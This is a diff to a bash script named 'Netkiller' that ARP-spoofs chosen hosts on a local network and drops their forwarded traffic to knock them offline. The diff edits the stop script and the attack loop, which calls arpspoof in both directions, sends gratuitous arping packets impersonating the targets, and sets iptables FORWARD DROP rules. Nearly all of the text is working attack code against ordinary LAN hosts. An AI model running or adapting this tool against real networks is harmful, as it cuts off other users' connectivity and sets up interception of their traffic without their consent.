@@ -85,15 +85,12 @@ cat > /bin/netkiller-stop << EOF
 
 iptables -F FORWARD
 pkill -f arpspoof
-echo 0 > /proc/sys/net/ipv4/ip_forward
+pkill -f arping
 echo " "
 echo "Netkiller Stopped. Restoring the connection..."
 echo " "
 EOF
 chmod 755 /bin/netkiller-stop
-
-# Iptables policy
-iptables -P FORWARD DROP
 
 # Display the expanded target list
 echo " "
@@ -106,9 +103,11 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 
 # Run arpspoof for each target IP
 for TARGET_IP in "${TARGET_IPS[@]}"; do
-    echo "Netkiller attacking the IP => $TARGET_IP"
-    sudo iptables -I FORWARD -s $TARGET_IP -j DROP
-    sudo iptables -I FORWARD -d $TARGET_IP -j DROP
+    echo "Netkiller blocking the IP => $TARGET_IP"
+    # iptables rules 
+    sudo iptables -P FORWARD DROP
+    sudo iptables -A FORWARD -s $TARGET_IP -j DROP
+    sudo iptables -A FORWARD -d $TARGET_IP -j DROP
     sudo arpspoof -i "$INTERFACE" -t "$TARGET_IP" -r "$GATEWAY" >/dev/null 2>&1 &
     sudo arpspoof -i "$INTERFACE" -t "$GATEWAY" -r "$TARGET_IP" >/dev/null 2>&1 &
     sudo arping -b -A -i "$INTERFACE" -S "$TARGET_IP" "$GATEWAY" >/dev/null 2>&1 &
